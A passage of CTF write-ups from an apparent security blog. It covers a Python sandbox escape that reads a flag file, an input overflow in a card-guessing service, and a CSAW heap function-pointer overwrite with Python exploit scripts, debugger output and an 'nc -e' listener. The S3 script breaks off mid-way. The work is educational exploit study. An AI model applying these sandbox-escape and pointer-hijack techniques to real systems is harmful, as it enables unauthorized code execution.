<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">[</span><span class="s">&#39;bytearray&#39;</span><span class="p">,</span> <span class="s">&#39;IndexError&#39;</span><span class="p">,</span> <span class="s">&#39;all&#39;</span><span class="p">,</span> <span class="s">&#39;help&#39;</span><span class="p">,</span> <span class="s">&#39;vars&#39;</span><span class="p">,</span> <span class="s">&#39;SyntaxError&#39;</span><span class="p">,</span> <span class="s">&#39;unicode&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeDecodeError&#39;</span><span class="p">,</span> <span class="s">&#39;isinstance&#39;</span><span class="p">,</span> <span class="s">&#39;copyright&#39;</span><span class="p">,</span> <span class="s">&#39;NameError&#39;</span><span class="p">,</span> <span class="s">&#39;BytesWarning&#39;</span><span class="p">,</span> <span class="s">&#39;dict&#39;</span><span class="p">,</span> <span class="s">&#39;input&#39;</span><span class="p">,</span> <span class="s">&#39;oct&#39;</span><span class="p">,</span> <span class="s">&#39;bin&#39;</span><span class="p">,</span> <span class="s">&#39;SystemExit&#39;</span><span class="p">,</span> <span class="s">&#39;StandardError&#39;</span><span class="p">,</span> <span class="s">&#39;format&#39;</span><span class="p">,</span> <span class="s">&#39;repr&#39;</span><span class="p">,</span> <span class="s">&#39;sorted&#39;</span><span class="p">,</span> <span class="s">&#39;False&#39;</span><span class="p">,</span> <span class="s">&#39;RuntimeWarning&#39;</span><span class="p">,</span> <span class="s">&#39;list&#39;</span><span class="p">,</span> <span class="s">&#39;iter&#39;</span><span class="p">,</span> <span class="s">&#39;reload&#39;</span><span class="p">,</span> <span class="s">&#39;Warning&#39;</span><span class="p">,</span> <span class="s">&#39;__package__&#39;</span><span class="p">,</span> <span class="s">&#39;round&#39;</span><span class="p">,</span> <span class="s">&#39;dir&#39;</span><span class="p">,</span> <span class="s">&#39;cmp&#39;</span><span class="p">,</span> <span class="s">&#39;set&#39;</span><span class="p">,</span> <span class="s">&#39;bytes&#39;</span><span class="p">,</span> <span class="s">&#39;reduce&#39;</span><span class="p">,</span> <span class="s">&#39;intern&#39;</span><span class="p">,</span> <span class="s">&#39;issubclass&#39;</span><span class="p">,</span> <span class="s">&#39;Ellipsis&#39;</span><span class="p">,</span> <span class="s">&#39;EOFError&#39;</span><span class="p">,</span> <span class="s">&#39;locals&#39;</span><span class="p">,</span> <span class="s">&#39;BufferError&#39;</span><span class="p">,</span> <span class="s">&#39;slice&#39;</span><span class="p">,</span> <span class="s">&#39;FloatingPointError&#39;</span><span class="p">,</span> <span class="s">&#39;sum&#39;</span><span class="p">,</span> <span class="s">&#39;getattr&#39;</span><span class="p">,</span> <span class="s">&#39;abs&#39;</span><span class="p">,</span> <span class="s">&#39;exit&#39;</span><span class="p">,</span> <span class="s">&#39;print&#39;</span><span class="p">,</span> <span class="s">&#39;True&#39;</span><span class="p">,</span> <span class="s">&#39;FutureWarning&#39;</span><span class="p">,</span> <span class="s">&#39;ImportWarning&#39;</span><span class="p">,</span> <span class="s">&#39;None&#39;</span><span class="p">,</span> <span class="s">&#39;hash&#39;</span><span class="p">,</span> <span class="s">&#39;ReferenceError&#39;</span><span class="p">,</span> <span class="s">&#39;len&#39;</span><span class="p">,</span> <span class="s">&#39;credits&#39;</span><span class="p">,</span> <span class="s">&#39;frozenset&#39;</span><span class="p">,</span> <span class="s">&#39;__name__&#39;</span><span class="p">,</span> <span class="s">&#39;ord&#39;</span><span class="p">,</span> <span class="s">&#39;super&#39;</span><span class="p">,</span> <span class="s">&#39;TypeError&#39;</span><span class="p">,</span> <span class="s">&#39;license&#39;</span><span class="p">,</span> <span class="s">&#39;KeyboardInterrupt&#39;</span><span class="p">,</span> <span class="s">&#39;UserWarning&#39;</span><span class="p">,</span> <span class="s">&#39;filter&#39;</span><span class="p">,</span> <span class="s">&#39;range&#39;</span><span class="p">,</span> <span class="s">&#39;staticmethod&#39;</span><span class="p">,</span> <span class="s">&#39;SystemError&#39;</span><span class="p">,</span> <span class="s">&#39;BaseException&#39;</span><span class="p">,</span> <span class="s">&#39;pow&#39;</span><span class="p">,</span> <span class="s">&#39;RuntimeError&#39;</span><span class="p">,</span> <span class="s">&#39;float&#39;</span><span class="p">,</span> <span class="s">&#39;MemoryError&#39;</span><span class="p">,</span> <span class="s">&#39;StopIteration&#39;</span><span class="p">,</span> <span class="s">&#39;globals&#39;</span><span class="p">,</span> <span class="s">&#39;divmod&#39;</span><span class="p">,</span> <span class="s">&#39;enumerate&#39;</span><span class="p">,</span> <span class="s">&#39;apply&#39;</span><span class="p">,</span> <span class="s">&#39;LookupError&#39;</span><span class="p">,</span> <span class="s">&#39;open&#39;</span><span class="p">,</span> <span class="s">&#39;quit&#39;</span><span class="p">,</span> <span class="s">&#39;basestring&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeError&#39;</span><span class="p">,</span> <span class="s">&#39;zip&#39;</span><span class="p">,</span> <span class="s">&#39;hex&#39;</span><span class="p">,</span> <span class="s">&#39;long&#39;</span><span class="p">,</span> <span class="s">&#39;next&#39;</span><span class="p">,</span> <span class="s">&#39;ImportError&#39;</span><span class="p">,</span> <span class="s">&#39;chr&#39;</span><span class="p">,</span> <span class="s">&#39;xrange&#39;</span><span class="p">,</span> <span class="s">&#39;type&#39;</span><span class="p">,</span> <span class="s">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s">&#39;Exception&#39;</span><span class="p">,</span> <span class="s">&#39;tuple&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeTranslateError&#39;</span><span class="p">,</span> <span class="s">&#39;reversed&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeEncodeError&#39;</span><span class="p">,</span> <span class="s">&#39;IOError&#39;</span><span class="p">,</span> <span class="s">&#39;hasattr&#39;</span><span class="p">,</span> <span class="s">&#39;delattr&#39;</span><span class="p">,</span> <span class="s">&#39;setattr&#39;</span><span class="p">,</span> <span class="s">&#39;raw_input&#39;</span><span class="p">,</span> <span class="s">&#39;SyntaxWarning&#39;</span><span class="p">,</span> <span class="s">&#39;compile&#39;</span><span class="p">,</span> <span class="s">&#39;ArithmeticError&#39;</span><span class="p">,</span> <span class="s">&#39;str&#39;</span><span class="p">,</span> <span class="s">&#39;property&#39;</span><span class="p">,</span> <span class="s">&#39;GeneratorExit&#39;</span><span class="p">,</span> <span class="s">&#39;int&#39;</span><span class="p">,</span> <span class="s">&#39;__import__&#39;</span><span class="p">,</span> <span class="s">&#39;KeyError&#39;</span><span class="p">,</span> <span class="s">&#39;coerce&#39;</span><span class="p">,</span> <span class="s">&#39;PendingDeprecationWarning&#39;</span><span class="p">,</span> <span class="s">&#39;file&#39;</span><span class="p">,</span> <span class="s">&#39;EnvironmentError&#39;</span><span class="p">,</span> <span class="s">&#39;unichr&#39;</span><span class="p">,</span> <span class="s">&#39;id&#39;</span><span class="p">,</span> <span class="s">&#39;OSError&#39;</span><span class="p">,</span> <span class="s">&#39;DeprecationWarning&#39;</span><span class="p">,</span> <span class="s">&#39;min&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeWarning&#39;</span><span class="p">,</span> <span class="s">&#39;execfile&#39;</span><span class="p">,</span> <span class="s">&#39;any&#39;</span><span class="p">,</span> <span class="s">&#39;complex&#39;</span><span class="p">,</span> <span class="s">&#39;bool&#39;</span><span class="p">,</span> <span class="s">&#39;ValueError&#39;</span><span class="p">,</span> <span class="s">&#39;NotImplemented&#39;</span><span class="p">,</span> <span class="s">&#39;map&#39;</span><span class="p">,</span> <span class="s">&#39;buffer&#39;</span><span class="p">,</span> <span class="s">&#39;max&#39;</span><span class="p">,</span> <span class="s">&#39;object&#39;</span><span class="p">,</span> <span class="s">&#39;TabError&#39;</span><span class="p">,</span> <span class="s">&#39;callable&#39;</span><span class="p">,</span> <span class="s">&#39;ZeroDivisionError&#39;</span><span class="p">,</span> <span class="s">&#39;eval&#39;</span><span class="p">,</span> <span class="s">&#39;__debug__&#39;</span><span class="p">,</span> <span class="s">&#39;IndentationError&#39;</span><span class="p">,</span> <span class="s">&#39;AssertionError&#39;</span><span class="p">,</span> <span class="s">&#39;classmethod&#39;</span><span class="p">,</span> <span class="s">&#39;UnboundLocalError&#39;</span><span class="p">,</span> <span class="s">&#39;NotImplementedError&#39;</span><span class="p">,</span> <span class="s">&#39;AttributeError&#39;</span><span class="p">,</span> <span class="s">&#39;OverflowError&#39;</span><span class="p">]</span></code></pre></div>


<p>On my system, the 80th value is &lsquo;open&rsquo;, but on the remote server, it&rsquo;s the 78th. Difference in Python version? Anyway, we can now call the fuction &lsquo;open&rsquo; like so and avoid the filter by using string concatenation:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()[</span><span class="mi">78</span><span class="p">]](</span><span class="s">&#39;/home/pybaby/fl&#39;</span><span class="o">+</span><span class="s">&#39;ag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span></code></pre></div>


<h1>pwn300</h1>

<p>By far the easiest 300 point challenge. Again, we&rsquo;re given an ip address. Upon connecting I did what I always do:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>nc 54.69.118.120 7000
Welcome to Google Gamble.
<span class="o">=========================</span>

Google Gamble is easy. Guess the card drawn
from the deck and double your money! Make it all
the way to <span class="nv">$1048576</span> to get a flag! Good luck!

Your current balance: 1<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
1
Please enter your guess: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
The computer picked AAAAAAAAAAAA�        <span class="o">(</span>Valet!<span class="o">)</span>
Congrats, you won this round!
Your current balance: 2<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAAAAAAAA
Congrats, you won this round!
Your current balance: 4<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAA
�
Congrats, you won this round!
Your current balance: 8<span class="err">$</span></code></pre></div>


<p>I have the sick tendency to either supply SQL injections or large repeats of &lsquo;A&rsquo;. Apparently, this program checks the guess of the user versus some precomputed value. However, the large input overwrites this precomputed value. The check will always be true and the money doubles. I just rinsed &amp; repeated until I had enough to extract the flag:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAA
�
Congrats, you won this round!
Your current balance: 16777216<span class="err">$</span>

Select an option:
1. Guess a card
2. Get the flag
3. Quit
2
Here is your well-deserved prize: flag<span class="o">{</span>valet_knekt_jack_jumbo<span class="o">}</span>
Congratulations!
Good bye!</code></pre></div>


<p><code>flag{valet_knekt_jack_jumbo}</code></p>

<p>And that was it! I hope there&rsquo;s more of this <code>tinyctf</code> to come!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF Expl 300: S3]]></title>
    <link href="http://barrebas.github.io/blog/2014/09/25/CSAW-s3/"/>
    <updated>2014-09-25T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/09/25/CSAW-s3</id>
    <content type="html"><![CDATA[<p>A while ago, we threw together a semi-official <a href="https://ctf-team.vulnhub.com">VulnHub CTF team</a>. This team participated in the CSAW CTF. For me, it was a new and <em>humbling</em> experience. I didn&rsquo;t get a lot of flags but I managed to get this one.</p>

<!--more-->


<p>Upon downloading the binary called <code>s3</code>, I connected to the remote server to quickly see what I was up against.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc 54.165.225.121 5333</code></pre></div>


<p>However, the connection timed out very quickly. I checked out the local copy with file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file s3
s3: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped</code></pre></div>


<p>Interesting, a 64 bit binary. Viewing it in <code>hopper</code> suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn&rsquo;t sit well with me, because I could hardly enter the second command to play around.</p>

<p>I fired up <code>gdb-peda</code> and ran the binary. It quickly showed the problem:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>r
warning: Could not load shared library symbols <span class="k">for</span> linux-vdso.so.1.
Do you need <span class="s2">&quot;set solib-search-path&quot;</span> or <span class="s2">&quot;set sysroot&quot;</span>?
Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>

    c &lt;<span class="nb">type</span>&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;<span class="nb">type</span>&gt;
                        Types are:
                            <span class="m">0</span> - NULL-Terminated String
                            <span class="m">1</span> - Counted String
    r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
    u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
    d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
    x                 - Exit Amazon S3

&gt; 
Program received signal SIGALRM, Alarm clock.</code></pre></div>


<p><img src="http://barrebas.github.io/assets/s3-gdb-alarm.png" alt="s3: gdb caught the alarm." /></p>

<p>Turns out this SIGALRM is generated by a call to <a href="http://linux.die.net/man/2/alarm">alarm()</a>. In hindsight, I could have made a library that overrides the call to <code>alarm()</code>, but I went with the hex-editing approach. I disassembled the binary using <code>objdump</code> and used <code>grep</code> to search the output for &ldquo;alarm&rdquo;:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>objdump -d s3 <span class="p">|</span> grep alarm
<span class="m">0000000000401300</span> &lt;alarm@plt&gt;:
  402126:   e8 d5 f1 ff ff          callq  <span class="m">401300</span> &lt;alarm@plt&gt;
  403771:   e8 8a db ff ff          callq  <span class="m">401300</span> &lt;alarm@plt&gt;</code></pre></div>


<p>Using <code>xxd</code>, <code>objdump</code> and <code>sed</code>, I replaced those bytes with NOPs and reversed the process with <code>xxd -r</code>, generating a new binary in the process that was devoid of annoying timeouts!</p>

<p>The binary allows the storage of two types of strings: NULL-terminated and so-called &ldquo;counted&rdquo; strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.</p>

<p><img src="http://barrebas.github.io/assets/s3-NULL-string.png" alt="s3: NULL-terminated strings, no problems!" /></p>

<p>Next, the obvious target was the &ldquo;counted&rdquo; string. I created a string &ldquo;bleh&rdquo;, updated it to &ldquo;blehbleh&rdquo; and tried to read from it&hellip; segfault! Awesome, we have a lead.</p>

<p><img src="http://barrebas.github.io/assets/s3-countedstring-segfault.png" alt="s3: counted strings... Oops!" /></p>

<p>Time to fire up <code>gdb</code> again and try to reproduce the crash:</p>

<p><img src="http://barrebas.github.io/assets/s3-reproduced-crash.png" alt="s3: success! Let's see what's going on." /></p>

<p>It looks like the updated string somehow overwrites a function pointer. This pointer is used here:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">=</span>&gt; 0x4019d6: call   QWORD PTR <span class="o">[</span>rax+0x10<span class="o">]</span></code></pre></div>


<p>Obviously, <code>0x42424242-0x10</code> holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack <code>EIP</code> and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:</p>

<p><img src="http://barrebas.github.io/assets/strings.png" alt="s3: exploitation flow" /></p>

<p>We store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode&hellip; confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:</p>

<p><img src="http://barrebas.github.io/assets/s3-gdb-id-is-address.png" alt="s3: memory addresses as string identifiers" /></p>

<p>I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> nc -e ./s3 -v -l -p 5333<span class="p">;</span> <span class="k">done</span></code></pre></div>


<p>Notice that I&rsquo;m using <code>s3</code> again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with <code>ulimit -c unlimited</code> and started scripting and debugging, a lot.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span><span class="o">&lt;</span>  
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 CTF!</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] first location = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>

<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; AAAA</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] second location = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>

<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>After running this (and careful debugging of the script) I got a coredump:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python ./amaz.py 
Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>

    c &lt;<span class="nb">type</span>&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;<span class="nb">type</span>&gt;
                        Types are:
                            <span class="m">0</span> - NULL-Terminated String
                            <span class="m">1</span> - Counted String
    r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
    u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
    d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
    x                 - Exit Amazon S3


<span class="o">[</span>+<span class="o">]</span> first <span class="nv">location</span> <span class="o">=</span> 0x00b10030
<span class="o">[</span>+<span class="o">]</span> second <span class="nv">location</span> <span class="o">=</span> 0x00b10050
bas@tritonal:~/documents/s3 writeup<span class="nv">$ </span>gdb ./s3 core
...snip...
gdb-peda<span class="nv">$ </span>i r
rax            0x41414141   0x41414141</code></pre></div>


<p>Good, we have control over <code>rax</code>. Now let&rsquo;s use this to dereference the pointer to the first string:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&gt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span></code></pre></div>


<p>Which obviously still crashes, because now the binary executes:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#0  0x0000000021465443 in ?? ()</span></code></pre></div>


<p>Which obviously contains no data, nor any code. But let&rsquo;s give it a proper pointer, shall we? And while I&rsquo;m at it, I&rsquo;ll set the shellcode to <code>INT3</code>. The stack is executable, so this should work!</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xCC\xCC\xCC\xCC\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>


<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>
